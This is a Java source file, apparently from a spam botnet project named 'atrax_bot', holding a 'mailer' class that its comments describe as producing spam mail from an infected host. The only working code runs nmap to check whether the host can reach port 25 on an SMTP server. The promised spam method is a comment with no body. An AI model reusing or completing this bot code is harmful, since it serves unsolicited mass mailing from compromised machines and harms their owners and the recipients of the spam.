/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package atrax_bot;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import java.text.DateFormat;
import java.util.Date;
import java.util.Locale;
/*****************************************
 * this class:
 *  is the class responsible for 
 *  creating the mail spam objects
 *  it's objects can also determine
 *  whether they can send the spam mails 
 *  or not.
 * @author sindat
 *****************************************/
public class mailer {
    String mode;
    String smtpServer;
    
    public mailer(bot theBot) {
        
    }
    
    /****************************************
     * this is the key method of this class.
     * it checks whether the host can send 
     * out mail on port 25
     ****************************************/
    private static Boolean canSendSMTP(String smtpServer){
        if(tools.runCmd("nmap -Pn " + smtpServer + " -p 25").contains("25/tcp open  smtp")) {
            return true;
        } else {
            return false;
        }
    }
    
    /*************************************
     * this method is is the
     * actual spam functionality
     * of this class. Runs if canSendSMTP
     * evaluates to TRUE.
     *************************************/
    
}
